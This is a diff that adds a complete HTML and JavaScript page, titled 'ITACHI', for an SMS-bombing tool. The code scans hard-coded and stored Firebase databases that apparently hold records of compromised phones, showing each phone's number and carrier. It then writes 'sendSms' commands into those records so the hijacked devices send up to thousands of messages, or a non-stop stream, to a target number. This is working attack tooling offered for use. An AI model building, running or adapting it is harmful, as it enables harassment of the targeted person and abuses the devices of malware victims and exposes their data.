@@ -1,0 +1,480 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, viewport-fit=cover" />
+<meta name="theme-color" content="#07040a" />
+<meta name="apple-mobile-web-app-capable" content="yes" />
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent" />
+<title>ITACHI</title>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&family=Noto+Serif+JP:wght@900&display=swap" rel="stylesheet" />
+<style>
+*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+:root{--bg:#07040a;--s:#0e0812;--s2:#140b18;--l:#241226;--l2:#1a0d1c;--t:#f2e8f5;--m:#7a6b82;--m2:#4a3f52;--r:#ff2d40;--rd:#8a001a;--g:#4ade80;--y:#f5c542;--v:#b794f6}
+html{-webkit-text-size-adjust:100%}
+body{background:var(--bg);color:var(--t);font-family:'Inter',-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;font-size:15px;line-height:1.45;min-height:100dvh;padding:calc(14px + env(safe-area-inset-top)) calc(14px + env(safe-area-inset-right,0px)) calc(20px + env(safe-area-inset-bottom)) calc(14px + env(safe-area-inset-left,0px));position:relative;overflow-x:hidden;-webkit-font-smoothing:antialiased}
+.bg{position:fixed;inset:0;z-index:0;pointer-events:none;overflow:hidden}
+.bg::before{content:'';position:absolute;inset:0;background:radial-gradient(circle at 50% 30%,rgba(255,45,64,.10) 0%,transparent 55%),radial-gradient(circle at 20% 90%,rgba(183,148,246,.06) 0%,transparent 50%),radial-gradient(circle at 80% 80%,rgba(255,45,64,.05) 0%,transparent 50%),var(--bg)}
+.eye{position:absolute;top:44%;left:50%;width:min(110vw,760px);height:min(110vw,760px);transform:translate(-50%,-50%);opacity:.15;filter:blur(.3px) saturate(1.15)}
+.iris{position:absolute;inset:0;border-radius:50%;background:radial-gradient(circle at 50% 50%,#ff3d4f 0%,#d41228 22%,#8a001a 48%,#3a000c 74%,#000 100%);box-shadow:0 0 90px rgba(255,45,64,.4),inset 0 0 120px rgba(0,0,0,.9)}
+.iris::before{content:'';position:absolute;inset:5%;border-radius:50%;background:repeating-conic-gradient(from 0deg,rgba(0,0,0,.6) 0deg 3deg,transparent 3deg 8deg,rgba(0,0,0,.4) 8deg 11deg,transparent 11deg 16deg);mix-blend-mode:multiply;animation:spinR 16s linear infinite reverse}
+.iris::after{content:'';position:absolute;inset:0;border-radius:50%;background:radial-gradient(circle,transparent 55%,rgba(0,0,0,.9) 80%,#000 100%)}
+.tomoe{position:absolute;inset:0;border-radius:50%;animation:spinR 11s linear infinite}
+.tomoe i{position:absolute;top:50%;left:50%;width:12%;height:12%;background:#000;border-radius:50% 50% 50% 0;transform-origin:0 0;box-shadow:0 0 16px rgba(0,0,0,.95)}
+.tomoe i:nth-child(1){transform:rotate(0deg) translate(-50%,-235%) rotate(45deg)}
+.tomoe i:nth-child(2){transform:rotate(120deg) translate(-50%,-235%) rotate(45deg)}
+.tomoe i:nth-child(3){transform:rotate(240deg) translate(-50%,-235%) rotate(45deg)}
+.pupil{position:absolute;top:50%;left:50%;width:15%;height:15%;transform:translate(-50%,-50%);border-radius:50%;background:#000;box-shadow:0 0 30px rgba(0,0,0,.95),inset 0 0 14px #000;animation:pupilPulse 4s ease-in-out infinite}
+.blink{position:absolute;inset:0;border-radius:50%;background:var(--bg);animation:blink 9s ease-in-out infinite}
+@keyframes spinR{to{transform:rotate(360deg)}}
+@keyframes pupilPulse{0%,100%{transform:translate(-50%,-50%) scale(1)}50%{transform:translate(-50%,-50%) scale(1.08)}}
+@keyframes blink{0%,88%,100%{clip-path:inset(0 0 0 0)}90%{clip-path:inset(48% 0 48% 0)}92%{clip-path:inset(0 0 0 0)}}
+@media(prefers-reduced-motion:reduce){.iris::before,.tomoe,.pupil,.blink{animation:none}}
+.app{position:relative;z-index:2;max-width:520px;margin:0 auto}
+.top{display:flex;align-items:center;gap:10px;margin-bottom:22px}
+.brand{font-family:'Noto Serif JP',serif;font-weight:900;font-size:22px;letter-spacing:.02em;display:flex;align-items:center;gap:1px}
+.brand .dot{width:7px;height:7px;border-radius:50%;background:var(--r);box-shadow:0 0 12px var(--r),0 0 24px var(--rd);margin-left:4px;animation:pulse 2s ease-in-out infinite}
+@keyframes pulse{0%,100%{opacity:.6;transform:scale(1)}50%{opacity:1;transform:scale(1.3)}}
+.brand .r{color:var(--r)}
+.brand .w{color:#fff}
+.spacer{flex:1}
+.icon-btn{width:38px;height:38px;border-radius:12px;background:var(--s);border:1px solid var(--l);color:var(--t);display:flex;align-items:center;justify-content:center;font-size:16px;cursor:pointer;text-decoration:none;transition:background .15s,border-color .15s}
+.icon-btn:active{background:var(--s2);border-color:var(--r)}
+.card{background:var(--s);border:1px solid var(--l);border-radius:18px;padding:18px;margin-bottom:14px}
+.label{font-size:11px;font-weight:600;text-transform:uppercase;letter-spacing:.08em;color:var(--m);margin-bottom:8px;display:block}
+.label .hint{font-weight:400;text-transform:none;letter-spacing:0;color:var(--m2);font-size:11px}
+input,textarea,select{width:100%;background:var(--s2);border:1px solid var(--l2);border-radius:12px;padding:13px 14px;color:var(--t);font-size:16px;font-family:inherit;outline:none;transition:border .15s,box-shadow .15s;appearance:none;-webkit-appearance:none}
+input:focus,textarea:focus,select:focus{border-color:var(--r);box-shadow:0 0 0 3px rgba(255,45,64,.1)}
+input::placeholder,textarea::placeholder{color:var(--m2)}
+textarea{min-height:92px;resize:vertical;line-height:1.5}
+select{background-image:url("data:image/svg+xml;charset=utf8,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='%237a6b82' stroke-width='2'%3E%3Cpath d='M6 9l6 6 6-6'/%3E%3C/svg%3E");background-repeat:no-repeat;background-position:right 12px center;background-size:18px;padding-right:40px}
+.field{margin-bottom:12px}
+.field:last-child{margin-bottom:0}
+.seg{display:flex;background:var(--s2);border:1px solid var(--l2);border-radius:12px;padding:3px;gap:3px}
+.seg button{flex:1;background:transparent;border:none;color:var(--m);font-family:inherit;font-size:13px;font-weight:600;padding:9px 8px;border-radius:9px;cursor:pointer;transition:background .15s,color .15s}
+.seg button.on{background:var(--r);color:#fff;box-shadow:0 2px 12px rgba(255,45,64,.35)}
+.btn{width:100%;height:54px;border:none;border-radius:14px;font-family:inherit;font-weight:700;font-size:16px;color:#fff;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:8px;transition:transform .12s,opacity .15s;touch-action:manipulation}
+.btn:active:not(:disabled){transform:scale(.98)}
+.btn:disabled{opacity:.45;cursor:not-allowed}
+.btn.primary{background:linear-gradient(135deg,#ff2d40,#8a001a);box-shadow:0 8px 28px rgba(255,45,64,.3)}
+.btn.gold{background:linear-gradient(135deg,#f5c542,#a16207);color:#1a0508;box-shadow:0 8px 28px rgba(245,197,66,.25)}
+.btn.ghost{background:var(--s);border:1px solid var(--l);color:var(--t)}
+.btn.dark{background:linear-gradient(135deg,#1a0d1c,#3a0a12)}
+.btn.sm{height:46px;font-size:14px}
+.btn-row{display:grid;grid-template-columns:1fr 1fr;gap:10px}
+.spinner{width:16px;height:16px;border:2px solid rgba(255,255,255,.25);border-top-color:#fff;border-radius:50%;animation:sp .8s linear infinite}
+@keyframes sp{to{transform:rotate(360deg)}}
+.status{display:grid;grid-template-columns:repeat(4,1fr);gap:6px;padding:12px 8px;background:var(--s);border:1px solid var(--l);border-radius:16px;margin-bottom:14px}
+.stat{text-align:center}
+.stat .k{font-size:9px;text-transform:uppercase;letter-spacing:.08em;color:var(--m);margin-bottom:3px}
+.stat .v{font-size:16px;font-weight:800;color:#fff;font-variant-numeric:tabular-nums}
+.stat .v.g{color:var(--g)}
+.stat .v.r{color:#ef4444}
+.stat .v.y{color:var(--y)}
+.progress-line{grid-column:1/-1;font-size:11px;color:var(--m);text-align:center;padding-top:4px;border-top:1px solid var(--l2);margin-top:4px;font-variant-numeric:tabular-nums}
+.devices{background:var(--s);border:1px solid var(--l);border-radius:16px;overflow:hidden;margin-bottom:14px}
+.devices-head{display:flex;align-items:center;justify-content:space-between;padding:11px 16px;background:var(--s2);border-bottom:1px solid var(--l2);font-size:11px;font-weight:700;text-transform:uppercase;letter-spacing:.08em;color:var(--r)}
+.devices-head .badge{background:rgba(255,45,64,.12);border:1px solid rgba(255,45,64,.3);color:var(--r);padding:2px 10px;border-radius:100px;font-size:11px;font-weight:700}
+.devices-list{max-height:300px;overflow-y:auto;-webkit-overflow-scrolling:touch}
+.devrow{display:grid;grid-template-columns:10px 1fr auto;gap:10px;align-items:center;padding:11px 16px;border-bottom:1px solid var(--l2);font-size:13px}
+.devrow:last-child{border-bottom:none}
+.devrow .dot{width:7px;height:7px;border-radius:50%;background:var(--g);box-shadow:0 0 8px rgba(74,222,128,.6)}
+.devrow .dot.off{background:#3a2a32;box-shadow:none}
+.devrow .meta{min-width:0}
+.devrow .id{color:var(--t);font-family:ui-monospace,Menlo,monospace;font-size:11px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.devrow .sub{color:var(--m);font-size:11px;margin-top:2px}
+.devrow .prov{color:var(--v);font-size:11px;text-align:right}
+.empty{padding:22px;text-align:center;color:var(--m2);font-size:13px}
+.log{background:var(--s);border:1px solid var(--l);border-radius:16px;padding:12px 14px;max-height:220px;overflow-y:auto;font-family:ui-monospace,Menlo,monospace;font-size:11px;line-height:1.7;-webkit-overflow-scrolling:touch}
+.log .e{display:flex;gap:8px;padding:2px 0}
+.log .t{color:var(--m2);flex-shrink:0;font-size:10px}
+.log .m{color:#9a8ba2;word-break:break-word}
+.log .m.ok{color:var(--g)}
+.log .m.err{color:#ef4444}
+.log .m.info{color:var(--r)}
+.log .m.warn{color:var(--y)}
+.sheet{position:fixed;inset:0;z-index:100;background:rgba(0,0,0,.7);backdrop-filter:blur(8px);-webkit-backdrop-filter:blur(8px);display:none;align-items:flex-end;justify-content:center}
+.sheet.on{display:flex}
+.sheet-body{width:100%;max-width:520px;background:var(--s);border-top-left-radius:24px;border-top-right-radius:24px;border:1px solid var(--l);border-bottom:none;padding:22px 20px calc(22px + env(safe-area-inset-bottom));animation:slideUp .28s cubic-bezier(.16,1,.3,1)}
+@keyframes slideUp{from{transform:translateY(100%)}to{transform:translateY(0)}}
+.sheet-handle{width:38px;height:4px;border-radius:2px;background:var(--l);margin:0 auto 16px}
+.sheet h3{font-size:16px;font-weight:800;color:var(--r);margin-bottom:16px}
+.hidden{display:none !important}
+.mb12{margin-bottom:12px}
+</style>
+</head>
+<body>
+
+<div class="bg" aria-hidden="true">
+  <div class="eye">
+    <div class="iris"></div>
+    <div class="tomoe"><i></i><i></i><i></i></div>
+    <div class="pupil"></div>
+    <div class="blink"></div>
+  </div>
+</div>
+
+<main class="app">
+  <header class="top">
+    <div class="brand"><span class="r">I</span><span class="w">TACHI</span><span class="dot"></span></div>
+    <div class="spacer"></div>
+    <a class="icon-btn" href="admin.html" aria-label="Admin">⚙</a>
+    <button class="icon-btn" id="btnKeys" aria-label="Keys">🔑</button>
+  </header>
+
+  <section class="card">
+    <div class="field">
+      <label class="label" for="target">📱 Target <span class="hint">country code + number</span></label>
+      <input id="target" type="tel" inputmode="numeric" autocomplete="off" placeholder="919876543210" />
+    </div>
+    <div class="field">
+      <label class="label" for="message">✉️ Message</label>
+      <textarea id="message" placeholder="Type your message…" autocomplete="off"></textarea>
+    </div>
+  </section>
+
+  <section class="card">
+    <label class="label">⚡ Mode</label>
+    <div class="seg" id="modeSeg">
+      <button data-mode="turbo" class="on">🔥 Turbo</button>
+      <button data-mode="slow">🐢 Slow</button>
+    </div>
+  </section>
+
+  <section class="card">
+    <div class="field">
+      <label class="label" for="qty">📦 Quantity</label>
+      <select id="qty">
+        <option>50</option><option>100</option><option>200</option><option>500</option>
+        <option>1000</option><option>2500</option><option selected>5000</option>
+      </select>
+    </div>
+  </section>
+
+  <button class="btn primary mb12" id="btnSend">🔥 AMATERASU</button>
+  <div class="btn-row mb12">
+    <button class="btn gold sm" id="btnNonstop">♾️ NON-STOP</button>
+    <button class="btn ghost sm" id="btnCheck">👁 DEVICES</button>
+  </div>
+  <button class="btn dark sm hidden mb12" id="btnStop">⛔ STOP</button>
+
+  <section class="status hidden" id="status">
+    <div class="stat"><div class="k">Devices</div><div class="v" id="vOnline">0</div></div>
+    <div class="stat"><div class="k">Sent</div><div class="v g" id="vSent">0</div></div>
+    <div class="stat"><div class="k">Fail</div><div class="v r" id="vFail">0</div></div>
+    <div class="stat"><div class="k">Round</div><div class="v y" id="vRound">0</div></div>
+    <div class="progress-line" id="vProgress">Idle</div>
+  </section>
+
+  <section class="devices hidden" id="devicesPanel">
+    <div class="devices-head"><span>👁 Online devices</span><span class="badge" id="devicesCount">0</span></div>
+    <div class="devices-list" id="devicesList"></div>
+  </section>
+
+  <div class="log" id="log"></div>
+</main>
+
+<div class="sheet" id="sheetKeys">
+  <div class="sheet-body">
+    <div class="sheet-handle"></div>
+    <h3>🔑 Access keys</h3>
+    <div class="field"><label class="label" for="kAm">AMATERASU key</label><input id="kAm" type="text" autocomplete="off" /></div>
+    <div class="field"><label class="label" for="kNs">NON-STOP key</label><input id="kNs" type="text" autocomplete="off" /></div>
+    <div class="btn-row" style="margin-top:14px">
+      <button class="btn ghost sm" id="kClose">Close</button>
+      <button class="btn primary sm" id="kSave">Save</button>
+    </div>
+  </div>
+</div>
+
+<script>
+const ACCESS_KEY = 'ITACHI';
+const FIREBASE_SECRET = '';
+const MESSAGE_LIMIT = 500;
+const FETCH_TIMEOUT_MS = 5000;
+const CONCURRENCY = 25;
+const YIELD_EVERY = 20;
+const RENDER_CHUNK = 50;
+const MAX_ROWS = 500;
+
+const LS_DBS = 'itachi_dbs';
+const LS_KEYS = 'itachi_keys';
+
+// yahan apni poori DB list daalo
+const FALLBACK_URLS = [
+  "https://ravikumar-1b0b8-default-rtdb.firebaseio.com",
+  "https://subhurediff-default-rtdb.firebaseio.com",
+  "https://priya-cfdb7-default-rtdb.firebaseio.com"
+];
+
+let KEY_AM = ACCESS_KEY;
+let KEY_NS = ACCESS_KEY;
+let SECRET = FIREBASE_SECRET;
+
+(function loadState(){
+  try{
+    const k = JSON.parse(localStorage.getItem(LS_KEYS) || '{}');
+    if (k.am) KEY_AM = k.am;
+    if (k.ns) KEY_NS = k.ns;
+  }catch(e){}
+})();
+
+function loadDBs(){
+  try{
+    const s = JSON.parse(localStorage.getItem(LS_DBS) || '[]');
+    if (Array.isArray(s) && s.length) return [...new Set(s)];
+  }catch(e){}
+  return [...new Set(FALLBACK_URLS)];
+}
+const DATABASE_URLS = loadDBs();
+
+const $ = id => document.getElementById(id);
+const targetI = $('target'), messageI = $('message'), qtyI = $('qty'), modeSeg = $('modeSeg');
+const btnSend = $('btnSend'), btnNonstop = $('btnNonstop'), btnCheck = $('btnCheck'), btnStop = $('btnStop');
+const statusEl = $('status'), logEl = $('log');
+const vOnline = $('vOnline'), vSent = $('vSent'), vFail = $('vFail'), vRound = $('vRound'), vProgress = $('vProgress');
+const devicesPanel = $('devicesPanel'), devicesList = $('devicesList'), devicesCount = $('devicesCount');
+
+let MODE = 'turbo';
+modeSeg.addEventListener('click', e => {
+  const b = e.target.closest('button'); if (!b) return;
+  MODE = b.dataset.mode;
+  [...modeSeg.children].forEach(x => x.classList.toggle('on', x === b));
+});
+
+function log(msg, type=''){
+  const t = new Date().toLocaleTimeString([], {hour12:false, hour:'2-digit', minute:'2-digit', second:'2-digit'});
+  const d = document.createElement('div');
+  d.className = 'e';
+  d.innerHTML = `<span class="t">${t}</span><span class="m ${type}">${msg}</span>`;
+  logEl.appendChild(d);
+  logEl.scrollTop = logEl.scrollHeight;
+}
+
+function randKey(){
+  const c = 'abcdefghijklmnopqrstuvwxyz0123456789';
+  let s = ''; for (let i=0;i<8;i++) s += c[Math.floor(Math.random()*c.length)];
+  return s;
+}
+
+function fetchT(url, opts={}, ms=FETCH_TIMEOUT_MS){
+  const ctl = new AbortController();
+  const t = setTimeout(()=>ctl.abort(), ms);
+  return fetch(url, {...opts, signal:ctl.signal})
+    .then(r => { clearTimeout(t); return r; })
+    .catch(e => { clearTimeout(t); throw e; });
+}
+
+async function fbFetch(base, path){
+  let url = base.replace(/\/$/,'') + '/' + path + '.json';
+  const key = SECRET && SECRET.trim() ? SECRET.trim() : randKey();
+  const p = new URLSearchParams({auth:key, orderBy:'"$key"', limitToLast:String(MESSAGE_LIMIT)});
+  const res = await fetchT(url + '?' + p, {method:'GET', headers:{Accept:'application/json'}});
+  if (!res.ok){
+    if (res.status === 401 || res.status === 403) throw new Error('DENIED');
+    if (res.status === 404) return null;
+    throw new Error('HTTP ' + res.status);
+  }
+  return res.json();
+}
+
+async function fbPut(base, path, data){
+  let url = base.replace(/\/$/,'') + '/' + path + '.json';
+  const key = SECRET && SECRET.trim() ? SECRET.trim() : randKey();
+  url += '?' + new URLSearchParams({auth:key});
+  const res = await fetchT(url, {method:'PUT', headers:{'Content-Type':'application/json'}, body: JSON.stringify(data)});
+  if (!res.ok){
+    if (res.status === 401 || res.status === 403) throw new Error('DENIED');
+    throw new Error('HTTP ' + res.status);
+  }
+  return res.json();
+}
+
+function parseClients(data){
+  const out = [];
+  if (!data || typeof data !== 'object') return out;
+  for (const [id, v] of Object.entries(data)){
+    if (!v || typeof v !== 'object') continue;
+    out.push({id, status:!!v.status, phone:String(v.mobNo || v.phone || v.mobile || v.phoneNumber || v.number || ''), provider:String(v.service_provider || '')});
+  }
+  return out;
+}
+
+function shuffle(a){
+  for (let i=a.length-1;i>0;i--){ const j = Math.floor(Math.random()*(i+1)); [a[i],a[j]] = [a[j],a[i]]; }
+  return a;
+}
+
+async function scan(onlineOnly){
+  const out = [];
+  for (let i=0;i<DATABASE_URLS.length;i+=CONCURRENCY){
+    const slice = DATABASE_URLS.slice(i, i+CONCURRENCY);
+    const batch = await Promise.allSettled(slice.map(async url => {
+      try{
+        const data = await fbFetch(url, 'clients');
+        if (!data) return {url, clients:[], error:null};
+        const parsed = parseClients(data);
+        return {url, clients: onlineOnly ? parsed.filter(c=>c.status) : parsed, error:null};
+      }catch(e){ return {url, clients:[], error:e.message}; }
+    }));
+    out.push(...batch);
+    await new Promise(r=>setTimeout(r,0));
+  }
+  return out;
+}
+
+let isSending = false, abortFlag = false, nonStopActive = false;
+
+async function runBulk(isNonStop){
+  if (isSending) return;
+  abortFlag = false;
+
+  const target = targetI.value.trim();
+  const message = messageI.value.trim();
+  const qty = parseInt(qtyI.value, 10);
+
+  if (!target){ log('Enter target number.', 'err'); return; }
+  if (!message){ log('Enter message.', 'err'); return; }
+  const clean = target.replace(/[^0-9]/g,'');
+  if (clean.length < 10 || clean.length > 15){ log('Invalid number.', 'err'); return; }
+
+  isSending = true; nonStopActive = isNonStop;
+  btnSend.disabled = true; btnNonstop.disabled = true; btnCheck.disabled = true;
+  if (isNonStop){ btnNonstop.classList.add('hidden'); btnStop.classList.remove('hidden'); }
+  else { btnSend.innerHTML = '<span class="spinner"></span>'; }
+  logEl.innerHTML = '';
+  statusEl.classList.remove('hidden');
+  vOnline.textContent = '0'; vSent.textContent = '0'; vFail.textContent = '0'; vRound.textContent = '0';
+  vProgress.textContent = isNonStop ? 'Non-stop scan…' : 'Scanning…';
+
+  let totalSent = 0, totalFailed = 0, round = 0;
+  const start = Date.now();
+
+  const results = await scan(true);
+  let devices = [], dbCount = 0, dbErrors = 0;
+  for (const r of results){
+    if (r.status !== 'fulfilled' || !r.value){ dbErrors++; continue; }
+    const v = r.value;
+    if (v.error) dbErrors++;
+    if (v.clients && v.clients.length){ devices.push(...v.clients.map(c => ({...c, dbUrl:v.url}))); dbCount++; }
+  }
+  shuffle(devices);
+  const total = devices.length;
+  vOnline.textContent = total;
+
+  if (!total){ log(`No online devices. ${dbErrors} errors.`, 'err'); finishRun(isNonStop, totalSent, totalFailed, start, round); return; }
+  log(`${total} online devices · ${dbCount} DBs · ${dbErrors} errors.`, 'ok');
+
+  let tasksSinceYield = 0, cursor = 0;
+
+  async function fireOne(device){
+    const path = `clients/${device.id}/webhookEvent/sendSms`;
+    const payload = { from:1, to:target, message, isSended:false };
+    try{
+      await fbPut(device.dbUrl, path, payload);
+      totalSent++; vSent.textContent = totalSent;
+      if (!isNonStop){
+        const pct = Math.round((totalSent/qty)*100);
+        vProgress.textContent = `${totalSent}/${qty} · ${pct}% · Round ${round}`;
+      } else {
+        vProgress.textContent = `${totalSent} sent · Round ${round} · ${((Date.now()-start)/1000).toFixed(0)}s`;
+      }
+    }catch(e){ totalFailed++; vFail.textContent = totalFailed; }
+    if (++tasksSinceYield >= YIELD_EVERY){ tasksSinceYield = 0; await new Promise(r=>setTimeout(r,0)); }
+  }
+
+  while (!abortFlag){
+    if (!isNonStop && totalSent >= qty) break;
+    round++; vRound.textContent = round;
+    const remaining = isNonStop ? total : (qty - totalSent);
+    const batchSize = Math.min(total, remaining, CONCURRENCY);
+    if (batchSize <= 0) break;
+    const batch = [];
+    for (let i=0;i<batchSize;i++) batch.push(devices[(cursor+i)%total]);
+    cursor = (cursor + batchSize) % total;
+    if (MODE === 'turbo'){ await Promise.all(batch.map(fireOne)); }
+    else { for (const d of batch){ await fireOne(d); await new Promise(r=>setTimeout(r,300)); } }
+    await new Promise(r=>setTimeout(r,0));
+  }
+
+  finishRun(isNonStop, totalSent, totalFailed, start, round);
+}
+
+function finishRun(isNonStop, sent, failed, start, round){
+  const elapsed = ((Date.now()-start)/1000).toFixed(1);
+  log(`${isNonStop?'Halted':'Done'} · ${sent} sent · ${failed} failed · ${elapsed}s · ${round} rounds`, sent>0 ? 'ok' : 'err');
+  btnSend.disabled = false; btnNonstop.disabled = false; btnCheck.disabled = false;
+  btnNonstop.classList.remove('hidden'); btnStop.classList.add('hidden');
+  btnSend.innerHTML = '🔥 AMATERASU';
+  isSending = false; nonStopActive = false;
+  vProgress.textContent = `${sent} sent · ${failed} failed · ${elapsed}s`;
+}
+
+btnSend.addEventListener('click', () => runBulk(false));
+btnNonstop.addEventListener('click', () => runBulk(true));
+btnStop.addEventListener('click', () => { if (nonStopActive){ abortFlag = true; log('STOP pressed.', 'warn'); } });
+
+let isChecking = false;
+btnCheck.addEventListener('click', async () => {
+  if (isChecking) return;
+  isChecking = true;
+  btnCheck.disabled = true;
+  btnCheck.innerHTML = '<span class="spinner"></span>';
+  devicesList.innerHTML = '';
+  devicesPanel.classList.add('hidden');
+  const start = Date.now();
+  log(`Scanning ${DATABASE_URLS.length} DBs…`, 'info');
+
+  const results = await scan(false);
+  let all = [], dbErrors = 0;
+  for (const r of results){
+    if (r.status !== 'fulfilled' || !r.value){ dbErrors++; continue; }
+    const v = r.value;
+    if (v.error) dbErrors++;
+    if (v.clients && v.clients.length) all.push(...v.clients.map(c => ({...c, dbUrl:v.url})));
+  }
+  const online = all.filter(c=>c.status);
+  const offline = all.length - online.length;
+  const elapsed = ((Date.now()-start)/1000).toFixed(1);
+
+  devicesPanel.classList.remove('hidden');
+  devicesCount.textContent = online.length;
+
+  if (!all.length){ devicesList.innerHTML = `<div class="empty">No devices. ${dbErrors} errors.</div>`; }
+  else {
+    const sorted = [...all].sort((a,b)=>(b.status?1:0)-(a.status?1:0));
+    const rows = sorted.slice(0, MAX_ROWS);
+    let html = '';
+    for (let i=0;i<rows.length;i++){
+      const d = rows[i];
+      html += `<div class="devrow"><span class="dot${d.status?'':' off'}"></span><div class="meta"><div class="id">${d.id}</div><div class="sub">${d.phone||'—'}</div></div><div class="prov">${d.provider||'—'}</div></div>`;
+      if ((i+1) % RENDER_CHUNK === 0){ devicesList.insertAdjacentHTML('beforeend', html); html = ''; await new Promise(r=>setTimeout(r,0)); }
+    }
+    if (html) devicesList.insertAdjacentHTML('beforeend', html);
+    if (sorted.length > MAX_ROWS){ devicesList.insertAdjacentHTML('beforeend', `<div class="empty">… ${sorted.length-MAX_ROWS} more hidden</div>`); }
+  }
+
+  log(`Check · ${online.length} online · ${offline} offline · ${dbErrors} errors · ${elapsed}s`, online.length>0 ? 'ok' : 'warn');
+  btnCheck.innerHTML = '👁 DEVICES';
+  btnCheck.disabled = false;
+  isChecking = false;
+});
+
+const sheet = $('sheetKeys'), kAm = $('kAm'), kNs = $('kNs');
+$('btnKeys').addEventListener('click', () => { kAm.value = KEY_AM; kNs.value = KEY_NS; sheet.classList.add('on'); });
+$('kClose').addEventListener('click', () => sheet.classList.remove('on'));
+sheet.addEventListener('click', e => { if (e.target === sheet) sheet.classList.remove('on'); });
+$('kSave').addEventListener('click', () => {
+  const a = kAm.value.trim(), n = kNs.value.trim();
+  if (!a || !n){ log('Keys cannot be empty.', 'err'); return; }
+  KEY_AM = a; KEY_NS = n;
+  try{ localStorage.setItem(LS_KEYS, JSON.stringify({am:a, ns:n})); }catch(e){}
+  log('Keys updated.', 'ok');
+  sheet.classList.remove('on');
+});
+
+log(`${DATABASE_URLS.length} DBs loaded.`, '');
+log(`Access key: ${ACCESS_KEY}`, '');
+</script>
+</body>
+</html>
